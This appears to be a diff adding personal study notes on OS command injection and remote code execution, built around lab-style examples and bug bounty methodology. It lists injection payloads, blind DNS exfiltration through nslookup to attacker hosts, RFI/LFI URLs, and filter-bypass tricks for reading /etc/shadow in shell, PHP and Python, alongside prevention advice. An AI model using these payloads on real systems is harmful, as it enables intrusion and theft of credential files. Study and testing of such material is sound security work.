@@ -1,0 +1,170 @@
+https://insecure-website.com/stockStatus?productID=381&storeID=29
+stockreport.pl 381 29
+& echo aiwefwlguh &
+stockreport.pl & echo aiwefwlguh & 29
+
+	Error - productID was not provided
+	aiwefwlguh
+	29: command not found
+
+
+storeId=2+&+whoami
+storeId=2+|+whoami
+productId=1+|+cat+/home/peter-mdk3nK/stockreport.sh+%23
+
+
+mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+& ping -c 10 127.0.0.1 &
+|| ping -c 10 127.0.0.1 ||
+& sleep 10 #
+
+email=test@test.com & whoami > /var/www/images/whoami.txt #
+
+email=test@test.com||whoami>/var/www/images/output.txt||
+
+
+& nslookup kgji2ohoyw.web-attacker.com &
+
+email=test@test.com & nslookup 6gndd65g8bqzmhyr1gj7q7nqphv7jw.oastify.com & 
+email=test@test.com & nslookup 6gndd65g8bqzmhyr1gj7q7nqphv7jw.oastify.com # 
+
+
+
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:
+wwwuser.kgji2ohoyw.web-attacker.com
+
+
+& nslookup `whoami`.jd0mlrj75a6lz1km033dcah6wx2nqc.oastify.com & 
+
+
+
+
+
+Ways of injecting OS commands:
+
+	The following command separators work on both Windows and Unix-based systems:
+
+	    &
+	    &&
+	    |
+	    ||
+
+	The following command separators work only on Unix-based systems:
+
+	    ;
+	    Newline (0x0a or \n)
+
+
+
+
+
+How to prevent OS command injection attacks:
+
+By far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In virtually every case, there are alternate ways of implementing the required functionality using safer platform APIs.
+
+If it is considered unavoidable to call out to OS commands with user-supplied input, then strong input validation must be performed. Some examples of effective validation include:
+
+    1) Validating against a whitelist of permitted values.
+    2) Validating that the input is a number.
+    3) Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
+
+Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker. 
+
+
+
+
+
+
+
+
+RCE & OS Command Injection:
+---------------------------------
+
+	1. Identify suspicious user-input locations. For code injections, take note of every user-input location, including URL parameters, HTTP headers, body parameters, and file uploads. To find potential file inclusion vulnerabilities, check for input locations being used to determine or construct filenames and for file-upload functions.
+
+	2. Submit test payloads to the input locations in order to detect potential vulnerabilities.
+
+	3. If your requests are blocked, try protection-bypass techniques and see if your payload succeeds.
+
+	4. Finally, confirm the vulnerability by trying to execute harmless commands such as whoami, ls, and sleep 5.
+
+	5. Avoid reading sensitive system files or altering any files with the vulnerability you’ve found.
+
+	6. Submit your first RCE report to the program!
+
+
+
+
+	Python payloads:
+	------------------
+		print("RCE test!")
+		"__import__('os').system('ls')"
+		"__import__('os').system('sleep 10')"
+
+	PHP payloads:
+	---------------
+		phpinfo();
+		<?php system("ls");?>
+		<?php system("sleep 10");?>
+
+
+	Unix payloads:
+	-----------------
+		;ls;
+		| sleep 10;
+		& sleep 10;
+		` sleep 10;`
+		$(sleep 10)
+
+	RFI:
+	-----
+		http://example.com/?page=http://attacker.com/malicious.php
+		http://example.com/?page=http:attacker.com/malicious.php
+
+	LFI:
+	-----
+		http://example.com/?page=../uploads/malicious.php
+		http://example.com/?page=..%2fuploads%2fmalicious.php
+
+
+	Bypasses:
+	----------
+
+		Unix:
+		------
+			cat /etc/shadow
+			cat "/e"tc'/shadow'
+			cat /etc/sh*dow
+			cat /etc/sha``dow
+			cat /etc/sha$()dow
+			cat /etc/sha${}dow
+			cat /e*'c/'p*s"swd"
+
+		PHP:
+		-----
+			system('cat /etc/shadow');
+			('sys'.'tem')('cat /etc/shadow');
+			system/**/('ls');
+			'\x73\x79\x73\x74\x65\x6d'('ls');
+
+		Python:
+		---------
+			__import__('os').system('cat /etc/shadow')
+			__import__('o'+'s').system('cat /etc/shadow')
+			__import__('\x6f\x73').system('cat /etc/shadow')
+
+		
+		Additionally, some servers concatenate the values of multiple parameters that have the same name into a single value. In this case, you can split malicious code into chunks to bypass input validation. For example, if the firewall blocks requests that contain the string system, you can split your RCE payload into chunks, like so:
+
+			GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
+			Host: example.com
+
+		you can hex-encode, URL-encode, double-URL-encode, and vary the cases (uppercase or lowercase characters) of your payloads. You can also try to insert special characters such as null bytes, newline characters, escape characters (\), and other special or non-ASCII characters into the payload. Then, observe which payloads are blocked and which ones succeed, and craft exploits that will bypass the filter to accomplish your desired results.
+
+
+
+
+
+
+
